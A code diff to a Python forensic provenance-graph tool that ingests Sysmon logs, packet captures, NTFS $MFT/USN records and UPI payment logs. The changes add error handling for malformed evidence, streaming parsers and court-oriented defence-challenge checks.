         elif cat == "REMOTE_ACCESS_SESSION":
             add(("IDENTITY", f"anydesk:{d.get('remote_client_id', '?')}"), device, REL_REMOTE_SESSION,
                 self._ts(d.get("timestamp_local"), local=True), m={"direction": d.get("direction")})
@@ -2125,16 +2656,17 @@ class TemporalProvenanceGraph:
             sid = (a or {}).get("session_id") or "unknown-session"
             target = (lead.get("statutory_actions") or {}).get("target_ip")
             caller = ("IDENTITY", f"caller@{target}" if target else "caller:unknown")
+            t_src = "WEBRTC_SESSION_JOIN" if sid in session_ts else None
             add(caller, ("CALL_SESSION", sid), REL_IMPERSONATED_CALL, session_ts.get(sid, 0),
-                m={"verdict": d.get("verdict"), "timestamp_source": "WEBRTC_SESSION_JOIN" if sid in session_ts else None})
-            self._endpoint_link(caller, target, session_ts.get(sid, 0), a, out)
+                m={"verdict": d.get("verdict"), "timestamp_source": t_src})
+            link(caller, target, session_ts.get(sid, 0), {"timestamp_source": t_src})
         elif cat == "WEBRTC_PEER_ENDPOINT":
             c = d.get("candidate") or {}
             sid = c.get("call_id") or (a or {}).get("session_id") or "unknown-session"
             ts = self._ts(c.get("timestamp_utc"))
             sock = ("SOCKET", f"{c.get('ip')}:{c.get('port')}")
             add(sock, ("CALL_SESSION", sid), REL_PEER_ENDPOINT, ts)
-            self._endpoint_link(sock, c.get("ip"), ts, a, out)
+            link(sock, c.get("ip"), ts)
             if st.startswith("ANDROID"):
                 observed_on(("CALL_SESSION", sid), ts)
         elif cat == "MIRROR_HAWALA_TOKEN":
@@ -2215,8 +2747,8 @@ class TemporalProvenanceGraph:
         Windows account the log belongs to.
         """
         n = 0
-        for off, line in iter_lines_with_offsets(path):
-            text = line.decode("utf-8", "replace")
+        for off, line, codec in iter_text_lines_with_offsets(path):
+            text = line.decode(codec, "replace")
             if " voip " not in text:
                 continue
             kv = dict(re.findall(r'(\w[\w-]*)=("[^"]*"|\S+)', text))
@@ -2271,72 +2803,92 @@ class TemporalProvenanceGraph:
         engine when present. An image load is kept only when the module is unsigned or sits in a
         user-writable folder (LOADED_MODULE taints the loader like an injection). Network connects
         and file creates wait (bounded, oldest flushed first) for the packet capture / $MFT record
-        that physically shows them; finalize_ingest() adds any left unmatched.
+        that physically shows them; finalize_ingest() adds any left unmatched. A line that is not a
+        JSON object, or an event whose fields cannot be read (a port that is not a number, ...), is
+        recorded as UNPARSEABLE_RECORD with its byte offset and the ingest goes on.
         """
         n = 0
-        for off, line in iter_lines_with_offsets(path):
+        name = self._source_name(path, display)
+        for off, line, codec in iter_text_lines_with_offsets(path):
             try:
-                ev = json.loads(line)
+                ev = json.loads(line.decode(codec, "surrogatepass"))
             except ValueError:
-                self._reject("UNPARSEABLE_RECORD", {"source_file": display or os.path.basename(path), "byte_offset": off})
+                self._reject("UNPARSEABLE_RECORD", {"source_file": name, "byte_offset": off})
                 continue
-            eid = ev.get("EventID")
-            ts = self._ts(ev.get("UtcTime"))
-            anchor = self.make_anchor(path, off, len(line), "SYSMON_EVENT_LOG_JSONL", display)
-            if eid == 1:
-                child = self._proc(ev.get("Image"), ev.get("ProcessId"))
-                parent = self._proc(ev.get("ParentImage"), ev.get("ParentProcessId"))
-                cmd = ev.get("CommandLine") or ""
-                score, mitre = 0.0, None
-                if self._log_engine is not None and cmd:
-                    r = self._log_engine.analyze_command(cmd, ev.get("Image"), ev.get("ParentImage"))
-                    score, mitre = float(r.get("threat_score") or 0.0), r.get("primary_mitre")
-                self.add_edge(("PROCESS", parent), ("PROCESS", child), REL_SPAWNED, ts, anchor, score,
-                              meta={"command_line": cmd[:512], "mitre": mitre} if score >= 0.5 else None)
-                n += 1
-                if score >= 0.5:
-                    for host, _port in _URL_RX.findall(cmd):
-                        self._iocs.add(host)
-                    for p in _WIN_PATH_RX.findall(cmd):
-                        if _basename(p) == _basename(ev.get("Image")) or p.lower() in self._pending_files:
-                            continue
-                        hosts, how = self._payload_hosts(cmd, p)
-                        self._hold(self._pending_files, p.lower(),
-                                   {"writer": child, "ts": ts, "anchor": anchor, "basis": "COMMAND_LINE_TARGET",
-                                    "payload_source_hosts": hosts, "payload_host_match": how}, self._flush_file)
-                if _basename(ev.get("ParentImage")) in USER_SHELLS and ev.get("User"):
-                    if self._binding(("IDENTITY", f"win:{ev['User']}"), ("PROCESS", child), REL_EXECUTED, ts,
-                                     anchor) is not None:
-                        n += 1
-            elif eid == 3:
-                key = (str(ev.get("SourceIp")), int(ev.get("SourcePort") or 0), str(ev.get("DestinationIp")),
-                       int(ev.get("DestinationPort") or 0))
-                self._hold(self._pending_net, key, {"proc": self._proc(ev.get("Image"), ev.get("ProcessId")),
-                                                    "image_path": ev.get("Image") or "", "ts": ts, "anchor": anchor},
-                           self._flush_net)
-            elif eid == 7 and ev.get("ImageLoaded"):
-                module = str(ev["ImageLoaded"])
-                unsigned = str(ev.get("Signed", "")).lower() in ("false", "0")
-                writable = bool(_USER_WRITABLE_RX.search(module))
-                if unsigned or writable:
-                    self.add_edge(("PROCESS", self._proc(ev.get("Image"), ev.get("ProcessId"))), ("FILE", module),
-                                  REL_LOADED_MODULE, ts, anchor, 0.85 if unsigned and writable else 0.6,
-                                  meta={"signed": not unsigned, "user_writable_path": writable,
-                                        "mitre": "T1574 - Hijack Execution Flow"})
+            if not isinstance(ev, dict):
+                self._reject("UNPARSEABLE_RECORD:not a JSON object", {"source_file": name, "byte_offset": off})
+                continue
+            try:
+                n += self._sysmon_event(ev, path, off, len(line), display)
+            except ProvenanceError:
+                raise
+            except _MALFORMED_ERRORS as exc:
+                self._reject(f"UNPARSEABLE_RECORD:{type(exc).__name__}: {exc}"[:200],
+                             {"source_file": name, "byte_offset": off})
+        return n
+
+    def _sysmon_event(self, ev: Dict[str, Any], path: str, off: int, length: int, display: Optional[str]) -> int:
+        n = 0
+        eid = ev.get("EventID")
+        ts = self._ts(ev.get("UtcTime"))
+        if eid == 3:
+            ports = (_port(ev.get("SourcePort")), _port(ev.get("DestinationPort")))
+            if None in ports:
+                raise ValueError(f"port is not a number: {ev.get('SourcePort')!r} / {ev.get('DestinationPort')!r}"[:120])
+        anchor = self.make_anchor(path, off, length, "SYSMON_EVENT_LOG_JSONL", display)
+        if eid == 1:
+            child = self._proc(ev.get("Image"), ev.get("ProcessId"))
+            parent = self._proc(ev.get("ParentImage"), ev.get("ParentProcessId"))
+            cmd = ev.get("CommandLine") or ""
+            score, mitre = 0.0, None
+            if self._log_engine is not None and cmd:
+                r = self._log_engine.analyze_command(cmd, ev.get("Image"), ev.get("ParentImage"))
+                score, mitre = float(r.get("threat_score") or 0.0), r.get("primary_mitre")
+            self.add_edge(("PROCESS", parent), ("PROCESS", child), REL_SPAWNED, ts, anchor, score,
+                          meta={"command_line": cmd[:512], "mitre": mitre} if score >= 0.5 else None)
+            n += 1
+            if score >= 0.5:
+                for host, _p in _URL_RX.findall(cmd):
+                    self._iocs.add(host)
+                for p in _WIN_PATH_RX.findall(cmd):
+                    if _basename(p) == _basename(ev.get("Image")) or p.lower() in self._pending_files:
+                        continue
+                    hosts, how = self._payload_hosts(cmd, p)
+                    self._hold(self._pending_files, p.lower(),
+                               {"writer": child, "ts": ts, "anchor": anchor, "basis": "COMMAND_LINE_TARGET",
+                                "payload_source_hosts": hosts, "payload_host_match": how}, self._flush_file)
+            if _basename(ev.get("ParentImage")) in USER_SHELLS and ev.get("User"):
+                if self._binding(("IDENTITY", f"win:{ev['User']}"), ("PROCESS", child), REL_EXECUTED, ts,
+                                 anchor) is not None:
                     n += 1
-            elif eid == 8:
-                self.add_edge(("PROCESS", self._proc(ev.get("SourceImage"), ev.get("SourceProcessId"))),
-                              ("PROCESS", self._proc(ev.get("TargetImage"), ev.get("TargetProcessId"))),
-                              REL_INJECTED_INTO, ts, anchor, 0.95, meta={"mitre": "T1055 - Process Injection"})
+        elif eid == 3:
+            key = (str(ev.get("SourceIp")), ports[0], str(ev.get("DestinationIp")), ports[1])
+            self._hold(self._pending_net, key, {"proc": self._proc(ev.get("Image"), ev.get("ProcessId")),
+                                                "image_path": ev.get("Image") or "", "ts": ts, "anchor": anchor},
+                       self._flush_net)
+        elif eid == 7 and ev.get("ImageLoaded"):
+            module = str(ev["ImageLoaded"])
+            unsigned = str(ev.get("Signed", "")).lower() in ("false", "0")
+            writable = bool(_USER_WRITABLE_RX.search(module))
+            if unsigned or writable:
+                self.add_edge(("PROCESS", self._proc(ev.get("Image"), ev.get("ProcessId"))), ("FILE", module),
+                              REL_LOADED_MODULE, ts, anchor, 0.85 if unsigned and writable else 0.6,
+                              meta={"signed": not unsigned, "user_writable_path": writable,
+                                    "mitre": "T1574 - Hijack Execution Flow"})
                 n += 1
-            elif eid == 11 and ev.get("TargetFilename"):
-                p = str(ev["TargetFilename"]).lower()
-                prior = self._pending_files.get(p) or {}
-                self._hold(self._pending_files, p,
-                           {"writer": self._proc(ev.get("Image"), ev.get("ProcessId")), "ts": ts, "anchor": anchor,
-                            "basis": "SYSMON_FILE_CREATE",
-                            "payload_source_hosts": prior.get("payload_source_hosts") or [],
-                            "payload_host_match": prior.get("payload_host_match")}, self._flush_file)
+        elif eid == 8:
+            self.add_edge(("PROCESS", self._proc(ev.get("SourceImage"), ev.get("SourceProcessId"))),
+                          ("PROCESS", self._proc(ev.get("TargetImage"), ev.get("TargetProcessId"))),
+                          REL_INJECTED_INTO, ts, anchor, 0.95, meta={"mitre": "T1055 - Process Injection"})
+            n += 1
+        elif eid == 11 and ev.get("TargetFilename"):
+            p = str(ev["TargetFilename"]).lower()
+            prior = self._pending_files.get(p) or {}
+            self._hold(self._pending_files, p,
+                       {"writer": self._proc(ev.get("Image"), ev.get("ProcessId")), "ts": ts, "anchor": anchor,
+                        "basis": "SYSMON_FILE_CREATE",
+                        "payload_source_hosts": prior.get("payload_source_hosts") or [],
+                        "payload_host_match": prior.get("payload_host_match")}, self._flush_file)
         return n
 
     def _net_score(self, dst_ip: str, image_path: str) -> float:
@@ -2351,23 +2903,32 @@ class TemporalProvenanceGraph:
         One CONNECTED_TO edge per TCP SYN, anchored to the packet record. The owning process comes
         from a matching Sysmon network-connect (same 4-tuple), whose line becomes a secondary anchor.
         Score: destination seen in a suspicious command line 0.9; process image in a user-writable
-        folder talking to a public IP 0.85; other public 0.3; private 0.05.
+        folder talking to a public IP 0.85; other public 0.3; private 0.05. A corrupt record header or a
+        capture cut inside a record stops the parse there and is recorded (PCAP_RECORD_CORRUPT /
+        TRUNCATED_CAPTURE, byte offset) as a rejection and an audit-ledger entry.
         """
         n = 0
-        for pkt in iter_pcap_tcp_syns(path):
-            key = (pkt["src_ip"], pkt["src_port"], pkt["dst_ip"], pkt["dst_port"])
-            owner = self._pending_net.pop(key, None)
-            anchor = self.make_anchor(path, pkt["byte_offset"], pkt["length"], "PCAP_PACKET_RECORD", display)
-            dst = ("SOCKET", f"{pkt['dst_ip']}:{pkt['dst_port']}")
-            if owner:
-                self.add_edge(("PROCESS", owner["proc"]), dst, REL_CONNECTED_TO, pkt["timestamp_ns"], anchor,
-                              self._net_score(pkt["dst_ip"], owner["image_path"]),
-                              secondary_anchors={"sysmon_network_connect": owner["anchor"]},
-                              meta={"attribution": "SYSMON_EVENT_3_4TUPLE"})
-            else:
-                self.add_edge(("HOST", pkt["src_ip"]), dst, REL_CONNECTED_TO, pkt["timestamp_ns"], anchor,
-                              self._net_score(pkt["dst_ip"], ""))
-            n += 1
+        name = self._source_name(path, display)
+        try:
+            for pkt in iter_pcap_tcp_syns(path):
+                key = (pkt["src_ip"], pkt["src_port"], pkt["dst_ip"], pkt["dst_port"])
+                owner = self._pending_net.pop(key, None)
+                anchor = self.make_anchor(path, pkt["byte_offset"], pkt["length"], "PCAP_PACKET_RECORD", display)
+                dst = ("SOCKET", f"{pkt['dst_ip']}:{pkt['dst_port']}")
+                if owner:
+                    self.add_edge(("PROCESS", owner["proc"]), dst, REL_CONNECTED_TO, pkt["timestamp_ns"], anchor,
+                                  self._net_score(pkt["dst_ip"], owner["image_path"]),
+                                  secondary_anchors={"sysmon_network_connect": owner["anchor"]},
+                                  meta={"attribution": "SYSMON_EVENT_3_4TUPLE"})
+                else:
+                    self.add_edge(("HOST", pkt["src_ip"]), dst, REL_CONNECTED_TO, pkt["timestamp_ns"], anchor,
+                                  self._net_score(pkt["dst_ip"], ""))
+                n += 1
+        except CaptureFormatError as exc:
+            detail = {"source_file": name, "byte_offset": exc.byte_offset, "packets_before": n,
+                      "note": "records after this offset could not be parsed"}
+            self._reject(exc.reason, detail)
+            self.audit.append(dict(detail, action="CAPTURE_UNREADABLE", reason=exc.reason))
         return n
 
     def _quarantine(self, name: str, kind: str, rec: Dict[str, Any], bad: int) -> None:
@@ -2375,6 +2936,19 @@ class TemporalProvenanceGraph:
              "bad_sector": bad, "record": rec.get("record_number", rec.get("file_record"))}
         self.timestomp_report["quarantined_records"].append(q)
         self.audit.append(dict(q, action="RECORD_QUARANTINED_BAD_SECTOR"))
+
+    def _unreadable(self, name: str, u: Dict[str, Any]) -> None:
+        """A $MFT / $J record (or extent) that could not be read: listed, made a finding and audit-logged."""
+        self.timestomp_report["unreadable_count"] += 1
+        if len(self.timestomp_report["unreadable_records"]) >= UNREADABLE_CAP:
+            return
+        e = {"source_file": name, "kind": u["kind"], "byte_offset": u["byte_offset"], "length": u.get("length"),
+             "sha256": u.get("sha256"), "record": u.get("record_number"), "error": u["error"]}
+        self.timestomp_report["unreadable_records"].append(e)
+        self.timestomp_report["findings"].append(dict(e, invariant=0, rule="UNREADABLE_RECORD", grade="INDICATIVE",
+                                                      note="not analysed: a timestomp verdict for this record "
+                                                           "cannot be given"))
+        self.audit.append(dict(e, action="RECORD_UNREADABLE"))
 
     def ingest_ntfs(self, image_path: str, mft_offset: int, mft_length: int, usn_offset: Optional[int] = None,
                     usn_length: Optional[int] = None, usn_stream_offset: int = 0, drive: str = "C:",
@@ -2387,42 +2961,90 @@ class TemporalProvenanceGraph:
         is quarantined before the invariants run (its bytes are not evidence). Each WROTE_FILE edge is
         anchored to the file's FILE record; its time is the kernel's, in this order: the journal's
         FILE_CREATE record (secondary anchor), else $FN.Created, else $SI.Created as recorded. All
-        recorded times are kept in the edge's meta.
+        recorded times are kept in the edge's meta; a kernel time an edge cannot carry (before 1970)
+        leaves the edge TIME_UNKNOWN and is listed in time_anomalies.
+
+        A slot that is not a readable FILE record ('BAAD', another signature, torn fixups, broken
+        header), a $J record that cannot be parsed, and an extent the image ends inside (SHORT_READ)
+        are reported: timestomp_analysis.unreadable_records, an UNREADABLE_RECORD finding, an audit
+        entry, and defence challenge D2 stays OPEN. The $MFT extent is read in record-aligned chunks.
         """
-        name = display or os.path.basename(image_path)
-        self.source_paths[name] = os.path.abspath(image_path)
+        name = self._source_name(image_path, display)
         screen = self._in_vault_image(name, "ABSOLUTE_IN_FILE")
+        records: List[_MftRec] = []
+        unreadable: List[Dict[str, Any]] = []
+        journal = None
+        step = max(1, (4 << 20) // MFT_RECORD_SIZE) * MFT_RECORD_SIZE
         with open(image_path, "rb") as f:
             f.seek(mft_offset)
-            mft = f.read(mft_length)
-            journal = None
+            got = 0
+            while got < mft_length:
+                want = min(step, mft_length - got)
+                buf = f.read(want)
+                for r in parse_mft(buf, mft_offset + got):
+                    bad = self._overlaps_bad_sector(r["byte_offset"], r["length"]) if screen else None
+                    if bad is not None:
+                        self._quarantine(name, "NTFS_MFT_FILE_RECORD", r, bad)
+                    elif r.get("error"):
+                        unreadable.append(dict(r, kind="NTFS_MFT_FILE_RECORD"))
+                    else:
+                        records.append(_MftRec(r))
+                if len(buf) < want:
+                    # the unread part starts at the first record the image does not hold in full
+                    whole = got + len(buf) // MFT_RECORD_SIZE * MFT_RECORD_SIZE
+                    unreadable.append({"kind": "NTFS_MFT_EXTENT", "byte_offset": mft_offset + whole,
+                                       "length": mft_length - whole, "error": "SHORT_READ (image ends inside the extent)"})
+                    break
+                got += len(buf)
             if usn_offset is not None and usn_length:
+                # streamed in bounded chunks; a record in a known-bad sector is quarantined as it is met. Of the
+                # rest, Invariants 3/4 read only each file's first FILE_CREATE and first CLOSE record and its
+                # BASIC_INFO_CHANGE records, so only those are retained (every record is still order-checked).
+                dropped: Set[int] = set()
+                first_create: Set[int] = set()
+                first_close: Set[int] = set()
+
+                def keep(jr: Dict[str, Any]) -> bool:
+                    if screen:
+                        bad = self._overlaps_bad_sector(jr["byte_offset"], jr["length"])
+                        if bad is not None:
+                            self._quarantine(name, "NTFS_USN_RECORD_V2", jr, bad)
+                            dropped.add(jr["byte_offset"])
+                            return False
+                    fr, why = jr["file_record"], jr["reason"]
+                    kept = bool(why & USN_REASON_BASIC_INFO_CHANGE)
+                    if why & USN_REASON_FILE_CREATE and fr not in first_create:
+                        first_create.add(fr)
+                        kept = True
+                    if why & USN_REASON_CLOSE and fr not in first_close:
+                        first_close.add(fr)
+                        kept = True
+                    return kept
+
+                walker = _UsnWalker(usn_offset, usn_stream_offset, keep=keep)
                 f.seek(usn_offset)
-                journal = parse_usn_journal(f.read(usn_length), usn_offset, usn_stream_offset)
-        records = []
-        for r in parse_mft(mft, mft_offset):
-            bad = self._overlaps_bad_sector(r["byte_offset"], r["length"]) if screen else None
-            if bad is not None:
-                self._quarantine(name, "NTFS_MFT_FILE_RECORD", r, bad)
-            else:
-                records.append(r)
-        if journal and screen:
-            kept, dropped = [], set()
-            for jr in journal["records"]:
-                bad = self._overlaps_bad_sector(jr["byte_offset"], jr["length"])
-                if bad is not None:
-                    self._quarantine(name, "NTFS_USN_RECORD_V2", jr, bad)
-                    dropped.add(jr["byte_offset"])
-                else:
-                    kept.append(jr)
-            if dropped:
-                creates: Dict[int, Dict[str, Any]] = {}
-                for jr in kept:
-                    if jr["reason"] & USN_REASON_FILE_CREATE and jr["file_record"] not in creates:
-                        creates[jr["file_record"]] = jr
-                viol = [v for v in journal["violations"] if v.get("byte_offset") not in dropped]
-                journal = dict(journal, records=kept, creates=creates, violations=viol,
-                               append_only_ok=not viol and not journal["errors"])
+                jgot = 0
+                while jgot < usn_length:
+                    want = min(4 << 20, usn_length - jgot)
+                    chunk = f.read(want)
+                    jgot += len(chunk)
+                    short = len(chunk) < want
+                    walker.feed(chunk, final=short or jgot >= usn_length)
+                    if short:
+                        unreadable.append({"kind": "NTFS_USN_EXTENT", "byte_offset": usn_offset + jgot,
+                                           "length": usn_length - jgot,
+                                           "error": "SHORT_READ (image ends inside the extent)"})
+                        break
+                journal = walker.result()
+                if dropped:
+                    viol = [v for v in journal["violations"] if v.get("byte_offset") not in dropped]
+                    journal = dict(journal, violations=viol, append_only_ok=not viol and not journal["errors"])
+        for e in (journal or {}).get("errors", []):
+            if not (screen and self._overlaps_bad_sector(e["byte_offset"], 8) is not None):
+                unreadable.append({"kind": "NTFS_USN_RECORD_V2", "byte_offset": e["byte_offset"], "length": None,
+                                   "error": e["error"]})
+        for u in unreadable:
+            self._unreadable(name, u)
         report = self.timestomp.assess(records, journal)
         paths = resolve_mft_paths(records, drive=drive)
         for fnd in report["findings"]:
@@ -2464,6 +3086,11 @@ class TemporalProvenanceGraph:
             meta = {"mft_record": r["record_number"], "timestamp_source": source, "recorded_timestamps": recorded,
                     "recorded_timestamp_ns": ts, "timestomp_verdict": verdict.get("verdict"),
                     "invariants_failed": verdict.get("invariants_failed"), "writer_attribution": intent["basis"]}
+            if ts < 0 or ts > CSRGraphArena.MAX_TS:
+                # e.g. $FN.Created rewritten to 1965 on the raw disk: kept as recorded, the edge's time is unknown
+                self._note_time_anomaly(ns_to_iso(ts), ts, f"{source}:{name}@{r['byte_offset']}")
+                meta["timestamp_out_of_range"] = True
+                ts = 0
             if intent.get("payload_source_hosts"):
                 meta["payload_source_hosts"] = intent["payload_source_hosts"]
                 meta["payload_host_match"] = intent.get("payload_host_match")
@@ -2473,19 +3100,24 @@ class TemporalProvenanceGraph:
             added += 1
         return {"records": len(records), "edges_added": added, "findings": len(report["findings"]),
                 "quarantined": len(self.timestomp_report["quarantined_records"]),
-                "journal_append_only_ok": report["journal_append_only_ok"]}
+                "unreadable": len(unreadable), "journal_append_only_ok": report["journal_append_only_ok"]}
 
     def ingest_bank_statement_csv(self, path: str, display: Optional[str] = None) -> int:
         """
         Columns: txn_id, timestamp_utc, holder_mobile, payer_vpa, payee_vpa, amount_inr[, channel].
         holder_mobile binds the statement's registered mobile to the payer VPA (OWNS); each row is
-        a UPI_TRANSFER scored 0.8 at or above Rs 1,00,000 and 0.2 below.
+        a UPI_TRANSFER scored 0.8 at or above Rs 1,00,000 and 0.2 below. Excel's "CSV UTF-8" (BOM) and
+        UTF-16 exports are read as such; a missing txn_id / timestamp_utc column is recorded once.
         """
         n, header = 0, None
-        for off, line in iter_lines_with_offsets(path):
-            cells = [c.strip() for c in line.decode("utf-8", "replace").split(",")]
+        name = self._source_name(path, display)
+        for off, line, codec in iter_text_lines_with_offsets(path):
+            cells = [c.strip() for c in line.decode(codec, "replace").split(",")]
             if header is None:
-                header = cells
+                header = [c.lstrip("\ufeff") for c in cells]
+                missing = [c for c in ("txn_id", "timestamp_utc") if c not in header]
+                if missing:
+                    self._reject("CSV_COLUMN_MISSING:" + "+".join(missing), {"source_file": name, "byte_offset": off})
                 continue
             row = dict(zip(header, cells))
             try:
@@ -2493,7 +3125,7 @@ class TemporalProvenanceGraph:
             except ValueError:
                 amount = float("nan")
             if not math.isfinite(amount) or not row.get("payer_vpa") or not row.get("payee_vpa"):
-                self._reject("UNPARSEABLE_RECORD", {"source_file": display or os.path.basename(path), "byte_offset": off})
+                self._reject("UNPARSEABLE_RECORD", {"source_file": name, "byte_offset": off})
                 continue
             ts = self._ts(row.get("timestamp_utc"))
             anchor = self.make_anchor(path, off, len(line), "BANK_STATEMENT_CSV_ROW", display)
@@ -2512,30 +3144,47 @@ class TemporalProvenanceGraph:
         """
         NPCI switch lines `ts RRN=.. PAYER=.. PAYEE=.. AMT=.. RESP=..`. A payer that pays fanout_min or
         more distinct payees within window_s is a dispersal hub; those legs score 0.9, others 0.2.
+        Two streaming passes (find hubs, then add edges), so only (time, payee) pairs are held in memory,
+        and a sliding window per payer, O(n log n) rather than quadratic in a payer's leg count.
         """
-        rows = []
-        for off, line in iter_lines_with_offsets(path):
-            text = line.decode("utf-8", "replace")
-            kv = dict(re.findall(r"(\w+)=(\S+)", text))
-            if "PAYER" in kv and "PAYEE" in kv:
-                rows.append((off, len(line), self._ts(text.split(" ", 1)[0]), kv))
+        def legs_of_file():
+            for off, line, codec in iter_text_lines_with_offsets(path):
+                text = line.decode(codec, "replace")
+                kv = dict(re.findall(r"(\w+)=(\S+)", text))
+                if "PAYER" in kv and "PAYEE" in kv:
+                    yield off, len(line), text, kv
+
         by_payer: Dict[str, List[Tuple[int, str]]] = defaultdict(list)
-        for _, _, ts, kv in rows:
-            by_payer[kv["PAYER"]].append((ts, kv["PAYEE"]))
+        for _off, _ln, text, kv in legs_of_file():
+            by_payer[kv["PAYER"]].append((self._ts(text.split(" ", 1)[0]), kv["PAYEE"]))
         hubs = set()
+        span = window_s * NS
         for payer, legs in by_payer.items():
             legs.sort()
-            for i in range(len(legs)):
-                window = {p for t, p in legs if legs[i][0] <= t <= legs[i][0] + window_s * NS}
-                if len(window) >= fanout_min:
+            inside: Counter = Counter()
+            j = 0
+            for i in range(len(legs)):        # payees with t in [t_i, t_i + window], as a two-pointer window
+                j = max(j, i)
+                while j < len(legs) and legs[j][0] <= legs[i][0] + span:
+                    inside[legs[j][1]] += 1
+                    j += 1
+                if len(inside) >= fanout_min:
                     hubs.add(payer)
                     break
-        for off, ln, ts, kv in rows:
+                if i < j:
+                    inside[legs[i][1]] -= 1
+                    if not inside[legs[i][1]]:
+                        del inside[legs[i][1]]
+        del by_payer
+        n = 0
+        for off, ln, text, kv in legs_of_file():
+            ts = self._ts(text.split(" ", 1)[0])
             anchor = self.make_anchor(path, off, ln, "NPCI_SWITCH_LOG", display)
             self.add_edge(("UPI_ACCOUNT", kv["PAYER"]), ("UPI_ACCOUNT", kv["PAYEE"]), REL_UPI_TRANSFER, ts, anchor,
                           0.9 if kv["PAYER"] in hubs else 0.2,
                           meta={"rrn": kv.get("RRN"), "amount_inr": kv.get("AMT"), "fan_out_hub": kv["PAYER"] in hubs})
-        return len(rows)
+            n += 1
+        return n
 
     def finalize_ingest(self) -> int:
         """Flush every record still waiting for corroboration (network connects, file creates)."""
@@ -2627,14 +3276,21 @@ class TemporalProvenanceGraph:
     def storyline_paradoxes(steps: Sequence[Dict[str, Any]], tolerance_ns: int = NS) -> List[Dict[str, Any]]:
         """Independent re-check on the exported steps: no step by a process predates that process's spawn step."""
         born: Dict[str, int] = {}
+        steps = [s for s in steps if isinstance(s, dict)]      # a damaged row is reported by the validator
+
+        def t_of(s: Dict[str, Any]) -> int:
+            t = s.get("timestamp_ns")
+            return t if isinstance(t, int) and not isinstance(t, bool) else 0
+
         for s in steps:
-            if s["relation"] == "SPAWNED" and s.get("timestamp_ns"):
-                born[s["target"]] = min(born.get(s["target"], s["timestamp_ns"]), s["timestamp_ns"])
+            t, tgt = t_of(s), s.get("target")
+            if s.get("relation") == "SPAWNED" and t and isinstance(tgt, str):
+                born[tgt] = min(born.get(tgt, t), t)
         out = []
         prev = None
         for s in steps:
-            t = s.get("timestamp_ns") or 0
-            if t and s["actor"] in born and t < born[s["actor"]] - tolerance_ns:
+            t, actor = t_of(s), s.get("actor")
+            if t and isinstance(actor, str) and actor in born and t < born[actor] - tolerance_ns:
                 out.append({"step": s.get("step"), "rule": "ACTOR_ACTS_BEFORE_IT_EXISTS"})
             if t and prev and t < prev:
                 out.append({"step": s.get("step"), "rule": "STEPS_NOT_CHRONOLOGICAL"})
@@ -2651,23 +3307,38 @@ class TemporalProvenanceGraph:
         """
         allrows = list(steps) + list(bindings)
         rows = []
-        ver = [p["anchor_reverified"] for p in _all_anchors(allrows)]
+        ver = [p.get("anchor_reverified") for p in _all_anchors(allrows)]
         a_ok = bool(self.sector_a and self.sector_a["manifest_digest"] == "VERIFIED")
-        rows.append({"id": "D1", "challenge": "Evidence was planted or altered after seizure",
+        integ = self.ingest_integrity()
+        custody = ""
+        if self.sector_a and self.sector_a.get("admissibility_status") not in (None, "READY_FOR_COURT"):
+            issues = "; ".join(self.sector_a.get("admissibility_blocking_issues") or [])
+            custody = (f"; custody between seizure and acquisition is Sector A's finding, not this row: "
+                       f"{self.sector_a['admissibility_status']}" + (f" ({issues})" if issues else ""))
+        rows.append({"id": "D1", "challenge": "Evidence was planted or altered after acquisition (Sector A hashing)",
                      "status": "REBUTTED" if (allrows and self.verify_anchors and all(v is True for v in ver)
-                                              and a_ok) else "OPEN",
+                                              and a_ok and integ["status"] == "OK") else "OPEN",
                      "basis": f"{sum(v is True for v in ver)}/{len(ver)} storyline anchors (primary and secondary) "
                               f"re-hashed from the evidence; Sector A manifest digest "
                               f"{'verified' if a_ok else 'not verified'}"
-                              + ("" if self.verify_anchors else "; ANCHOR VERIFICATION WAS DISABLED")})
+                              + ("" if self.verify_anchors else "; ANCHOR VERIFICATION WAS DISABLED")
+                              + (f"; {integ['anchor_hash_mismatches']} anchor(s) offered at ingest no longer match "
+                                 f"the evidence bytes (altered after they were recorded)"
+                                 if integ["anchor_hash_mismatches"] else "") + custody,
+                     "evidence": integ["leads"]})
         cr = self.causality_report or {"unresolved": 0, "repaired": 0, "paradoxes_detected": 0}
         sp = self.storyline_paradoxes(steps)
         repaired = [s["edge_uid"] for s in steps if s["timestamp_basis"] == "REPAIRED_LOWER_BOUND"]
+        unread = self.timestomp_report.get("unreadable_count", 0)
+        odd_times = len(self.time_anomalies)
         rows.append({"id": "D2", "challenge": "Timestamps were manipulated to fabricate the sequence",
-                     "status": "REBUTTED" if not sp and cr["unresolved"] == 0 else "OPEN",
+                     "status": "REBUTTED" if not sp and cr["unresolved"] == 0 and not unread and not odd_times
+                     else "OPEN",
                      "basis": f"{cr['paradoxes_detected']} causality inversions found and {cr['repaired']} repaired "
                               f"(disclosed per step); {len(self.timestomp_report['findings'])} $MFT/$J findings; "
-                              f"{len(sp)} inversions left in the storyline",
+                              f"{len(sp)} inversions left in the storyline"
+                              + (f"; {unread} $MFT/$J record(s) unreadable, so not analysed" if unread else "")
+                              + (f"; {odd_times} record time(s) outside 1970-2554 kept as unknown" if odd_times else ""),
                      "evidence": repaired})
         fin = [s for s in steps if s["stage"] == 4 and s.get("timestamp_ns")]
         human = [s for s in steps if s["relation"] in ("IMPERSONATED_CALL", "REMOTE_SESSION") and s.get("timestamp_ns")]
@@ -2684,7 +3355,8 @@ class TemporalProvenanceGraph:
                      "status": "REBUTTED" if self.sector_a is not None else "NOT_EVALUATED",
                      "basis": (f"Sector A recorded {len(self.bad_sectors)} unreadable sector(s); "
                                f"{self.rejected_count.get('ANCHOR_IN_BAD_SECTOR', 0)} anchor(s) inside them were refused"
-                               if self.sector_a is not None else "no Sector A manifest bound")})
+                               if self.sector_a is not None else "no Sector A manifest bound")
+                              + (f"; {unread} damaged $MFT/$J record(s) were reported and not used" if unread else "")})
         cl = self.exculpatory_checklist
         if cl and cl.get("checks"):
             intr = [c["check"] for c in cl["checks"] if c.get("result") == "SUPPORTS_INTRUSION_HYPOTHESIS"]
@@ -2705,7 +3377,8 @@ class TemporalProvenanceGraph:
                          write: bool = True) -> Dict[str, Any]:
         res = self.solve_storyline(max_nodes, lam)
         es = [self.edge(q) for q in res["edges"]]
-        order = lambda e: (e["ts"] == 0, e["ts"], e["provenance"]["byte_offset"], self.edge_uid(e))
+        order = lambda e: (e["ts"] == 0, e["ts"], e["provenance"]["byte_offset"], CAUSAL_RANK.get(e["rel"], 1),
+                           self.edge_uid(e))
         actions = sorted((e for e in es if e["rel"] not in BINDING_RELATIONS), key=order)
